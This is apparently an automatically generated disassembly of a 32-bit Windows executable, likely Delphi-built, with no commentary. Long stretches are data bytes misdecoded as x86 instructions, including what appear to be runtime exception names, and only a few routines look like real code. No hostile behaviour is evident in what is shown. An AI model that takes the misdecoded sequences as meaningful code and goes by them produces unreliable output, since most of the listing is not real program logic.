add [ edi + edi * 8 + 0x46640000 ] ah
inc edi
add [ ebp + 0x640000ff ] ah
inc esi
inc edi
add [ esi + 0x640000ff ] ah
inc esi
inc edi
add [ edi + 0x640000ff ] ah
inc esi
inc edi
add [ eax + 0x640000ff ] ch
inc esi
inc edi
add [ ecx + 0x640000ff ] ch
inc esi
inc edi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_406f55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f5c
retn
sub_406f6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x6f
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
outsd
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] bh
inc eax
add [ eax ] dl
add [ eax ] al
add al dl
outsd
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
outsd
outsb
sbb al 0x70
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
sbb al 0xb6
inc eax
add [ eax + 0xe004032 ] al
inc ebp
dec eax
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 ] ch
dec edi
dec bp
insd
outsd
jb r-xdata
loopne r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jno r-xdata
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
add [ eax ] al
sub al 0x71
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x70
inc eax
add [ eax ] ch
xor al [ eax ]
sbb al 0xb6
inc eax
add [ eax + 0xc004032 ] al
inc ebp
dec edi
jne r-xdata
inc eax
aam 0x70
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
jo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x71
inc eax
popad
insb
mov eax eax
test [ ecx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x100040 ] al
add [ eax ] al
loopne r-xdata
inc ebp
jb r-xdata
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x40707890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi + 0x40 ] al
add [ eax + 0xb004032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x100040 ] dl
add [ eax ] al
cwde
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] bh
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0x40 ] dh
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
jae r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jb r-xdata
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add al bl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
xchg esp eax
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] dl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x73 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8f ] bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jb r-xdata
outsd
jb r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8f ] bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
inc ebp
inc ebp
js r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x9004032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004073 ] ah
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
add [ edx + esi + 0x40 ] al
add [ eax + 0xc004032 ] al
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8f ] bl
inc ebp
inc ebp
js r-xdata
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x12004032 ] al
sar [ edx + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add ah bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x4073f890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc ebp
jb r-xdata
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
jbe r-xdata
add [ eax ] al
add ah bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x10004073 ]
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x72
imul ebp [ edi + 0x6e ] 0x4071e490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004074 ] ch
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add ah bh
jb r-xdata
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
outsd
jb r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
inc eax
add [ eax + 0x73 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x40 ] dh
jb r-xdata
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x74506564
inc eax
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x4f746e49 ] cl
mov al [ 0x4073 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] bl
add [ eax ] dl
add [ eax ] al
add al dl
outsd
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
sbb al 0xb6
inc eax
add [ eax + 0xf004032 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
jne r-xdata
insb
outsd
ja r-xdata
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
outsb
lea eax [ eax ]
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004075 ] bh
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x6e6f4345 ] cl
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x61766e49 ] cl
inc ebp
dec edi
jbe r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x9004032 ] al
add [ ebp + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
add [ eax ] al
lea eax [ eax ]
mov eax 0x4075
jne r-xdata
jne r-xdata
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
inc eax
add [ eax ] al
add ah bh
jb r-xdata
shr [ eax + 0x4074 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x74
inc eax
add [ eax ] dl
int3
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x40 ] dh
inc ebp
jb r-xdata
add [ eax ] al
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
jbe r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0xd004032 ] al
inc ebp
inc ebx
outsd
outsb
add [ eax ] al
add [ edx + esi + 0x40 ] al
add [ eax + 0xc004032 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jbe r-xdata
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsd
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax + 0x4075 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
add [ eax ] al
jbe r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0xe004032 ] al
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
inc eax
inc eax
rcl [ esi + esi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al ah
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
ja r-xdata
inc ebp
push ebx
je r-xdata
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004077 ] al
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi + 0x40 ] dh
insb
nop
int3
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
mov eax eax
xor [ edi + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
inc eax
rcr ah 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
ja r-xdata
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] dl
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edi + 0x40 ] 0x0
or al 0x0
add [ eax ] al
push 0xd800406f
insb
outsd
ja r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
push eax
jb r-xdata
sub [ edi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x40
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
js r-xdata
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
cmp al 0x78
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
cwde
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
inc ebp
dec ecx
outsb
je r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0xe004032 ] al
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004078 ] bl
add [ eax ] al
add [ eax + 0x6f ] ch
inc eax
add al bl
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jns r-xdata
inc ebp
jb r-xdata
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x40796490
loopne r-xdata
push ebp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
inc eax
add [ ecx + edi * 2 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] cl
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407a543f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ edx + 0x40 ]
add [ eax + 0x7a ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jpe r-xdata
jb r-xdata
rcl ah 0xe9
rsqrtps xmm0 [ eax ]
add [ ebx - 0x5c162b40 ] al
push edx
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd4
jmp r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xca
inc eax
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
insb
jae r-xdata
aam 0xe9
or edx [ ebx ]
add [ ebx + 0x6fe9d4c0 ] al
push ebx
add [ eax ] al
add eax 0xffffffd4
jmp sub_40cc3c
add [ eax + eax ] al
add [ eax - 0x27ffbff0 ] ah
adc [ ecx + 0x47213415 ] cl
add [ ebx + 0x472ed015 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34d80040 ] dl
inc eax
add ah cl
push esi
inc eax
add al bl
push esi
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add al ch
push esi
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x240040cb ] dh
push esp
dec ebp
jne r-xdata
xor al 0x40
add ah ah
xor al 0x40
add al ch
add eax 0xffffffd4
jmp sub_40cd28
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ eax + 0x11004079 ] 0x3
cmp [ cs : esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
push ebx
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ edx + esi + 0x40 ] al
add [ edx + ecx * 8 ] cl
je r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
xor al 0x21
inc edi
add [ ebx + 0x34158910 ] cl
and [ edi ] eax
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
stosd [ edi ]
push edx
popad
inc ebp
js r-xdata
pop ebx
pop ebp
retn 0xc
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
insb
jne r-xdata
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
sar bh 0xff
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407b04
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407b20
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
